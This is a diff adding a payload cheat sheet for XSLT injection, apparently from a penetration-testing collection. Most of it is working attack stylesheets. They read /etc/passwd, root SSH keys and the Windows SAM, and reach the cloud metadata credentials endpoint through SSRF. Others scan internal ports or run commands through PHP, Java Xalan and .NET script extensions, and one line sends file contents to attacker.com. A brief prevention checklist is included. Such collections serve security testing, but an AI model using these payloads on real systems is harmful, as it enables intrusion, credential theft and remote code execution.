@@ -1,0 +1,316 @@
+# XSLT (Extensible Stylesheet Language Transformations) Injection Payloads
+
+## ========================================
+## BASIC XSLT INJECTION
+## ========================================
+
+# File inclusion
+<xsl:value-of select="document('file:///etc/passwd')"/>
+
+# System information
+<xsl:value-of select="system-property('xsl:version')"/>
+<xsl:value-of select="system-property('xsl:vendor')"/>
+<xsl:value-of select="system-property('xsl:vendor-url')"/>
+
+## ========================================
+## FILE READ (LOCAL)
+## ========================================
+
+# Read /etc/passwd
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:value-of select="document('file:///etc/passwd')"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+# Read Windows files
+<xsl:value-of select="document('file:///C:/Windows/win.ini')"/>
+
+## ========================================
+## SSRF VIA XSLT
+## ========================================
+
+# HTTP request
+<xsl:value-of select="document('http://internal-server/api')"/>
+<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
+
+# Internal network scan
+<xsl:value-of select="document('http://192.168.1.1')"/>
+
+## ========================================
+## REMOTE CODE EXECUTION
+## ========================================
+
+# PHP (via popen extension)
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:php="http://php.net/xsl">
+  <xsl:template match="/">
+    <xsl:value-of select="php:function('system','whoami')"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+# Using registerPHPFunctions
+<xsl:value-of select="php:function('exec','whoami')"/>
+<xsl:value-of select="php:function('system','cat /etc/passwd')"/>
+
+## ========================================
+## JAVA XSLT RCE
+## ========================================
+
+# Java Runtime execution
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+  <xsl:template match="/">
+    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
+    <xsl:variable name="process" select="rt:exec($rtobject,'calc')"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+## ========================================
+## .NET XSLT INJECTION
+## ========================================
+
+# Script execution
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+  xmlns:user="http://mycompany.com/mynamespace">
+  <msxsl:script language="C#" implements-prefix="user">
+    <![CDATA[
+    public string execute() {
+      System.Diagnostics.Process.Start("calc");
+      return "Executed";
+    }
+    ]]>
+  </msxsl:script>
+  <xsl:template match="/">
+    <xsl:value-of select="user:execute()"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+## ========================================
+## PORT SCANNING
+## ========================================
+
+# Scan internal ports
+<xsl:value-of select="document('http://localhost:22')"/>
+<xsl:value-of select="document('http://localhost:80')"/>
+<xsl:value-of select="document('http://localhost:3306')"/>
+<xsl:value-of select="document('http://localhost:8080')"/>
+
+## ========================================
+## DATA EXFILTRATION
+## ========================================
+
+# Send data to attacker
+<xsl:value-of select="document(concat('http://attacker.com/?data=',document('file:///etc/passwd')))"/>
+
+# Exfiltrate via error
+<xsl:message terminate="yes">
+  <xsl:value-of select="document('file:///etc/passwd')"/>
+</xsl:message>
+
+## ========================================
+## DIRECTORY LISTING
+## ========================================
+
+# List directory
+<xsl:value-of select="document('file:///')"/>
+<xsl:value-of select="document('file:///etc/')"/>
+
+## ========================================
+## XXE VIA XSLT
+## ========================================
+
+# Combine with XXE
+<!DOCTYPE xsl:stylesheet [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:value-of select="'&xxe;'"/>
+  </xsl:template>
+</xsl:stylesheet>
+
+## ========================================
+## BLIND XSLT INJECTION
+## ========================================
+
+# Time-based detection
+<xsl:value-of select="document('http://slow-endpoint.com')"/>
+
+# Error-based
+<xsl:value-of select="1 div 0"/>
+
+## ========================================
+## XSLT 2.0/3.0 FEATURES
+## ========================================
+
+# XSLT 2.0 file read
+<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
+
+# Regular expressions
+<xsl:value-of select="replace('test','t','LEAKED')"/>
+
+## ========================================
+## DETECTION PAYLOADS
+## ========================================
+
+# Basic detection
+<xsl:value-of select="1+1"/>
+
+# Version detection
+<xsl:value-of select="system-property('xsl:version')"/>
+
+# Vendor detection
+<xsl:value-of select="system-property('xsl:vendor')"/>
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Encoding
+document('file&#58;//etc/passwd')
+
+# Alternative functions
+unparsed-text() (XSLT 2.0)
+doc() function
+
+## ========================================
+## EXPLOITATION TEMPLATES
+## ========================================
+
+# Template 1: File read
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+  <html>
+    <body>
+      <pre><xsl:value-of select="document('file:///etc/passwd')"/></pre>
+    </body>
+  </html>
+</xsl:template>
+</xsl:stylesheet>
+
+# Template 2: SSRF
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+  <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
+</xsl:template>
+</xsl:stylesheet>
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify XSLT processing
+Look for XML transformation
+
+# 2. Test basic injection
+<xsl:value-of select="1+1"/>
+
+# 3. Test file access
+<xsl:value-of select="document('file:///etc/passwd')"/>
+
+# 4. Test RCE
+Use platform-specific payloads
+
+# 5. Exploit
+Read files, RCE, SSRF
+
+## ========================================
+## PLATFORM-SPECIFIC
+## ========================================
+
+# libxslt (PHP/Python)
+document('file:///etc/passwd')
+
+# Saxon (Java)
+unparsed-text('file:///etc/passwd')
+
+# .NET
+msxsl:script for RCE
+
+# Xalan (Java)
+Java Runtime execution
+
+## ========================================
+## REAL-WORLD PAYLOADS
+## ========================================
+
+# AWS metadata
+<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
+
+# Read SSH keys
+<xsl:value-of select="document('file:///root/.ssh/id_rsa')"/>
+
+# Windows SAM
+<xsl:value-of select="document('file:///C:/Windows/System32/config/SAM')"/>
+
+## ========================================
+## COMMON INJECTION POINTS
+## ========================================
+
+# User-controlled XSLT
+Upload XSLT file
+Provide XSLT in parameter
+
+# XML + XSLT transformation
+Server-side transformation
+PDF generation
+Report generation
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Manual testing
+Burp Suite Repeater
+
+# Automated
+- XSLTBench
+- Custom scripts
+
+# Verification
+Test locally with xsltproc
+
+## ========================================
+## PREVENTION TESTING
+## ========================================
+
+# Check if:
+- [ ] XSLT processing is disabled
+- [ ] document() is disabled
+- [ ] External entities disabled
+- [ ] Input validation exists
+- [ ] Sandboxing is implemented
+
+## ========================================
+## ADVANCED EXPLOITATION
+## ========================================
+
+# Chained attacks
+XSLT + XXE
+XSLT + SSRF
+XSLT + File upload
+
+# Polyglot payloads
+Valid XSLT + XSS
+Valid XSLT + XXE
+
+## ========================================
+## ERROR MESSAGES
+## ========================================
+
+# Trigger errors for info
+<xsl:value-of select="invalid-function()"/>
+
+# Parse errors
+<xsl:value-of select="1 div 0"/>
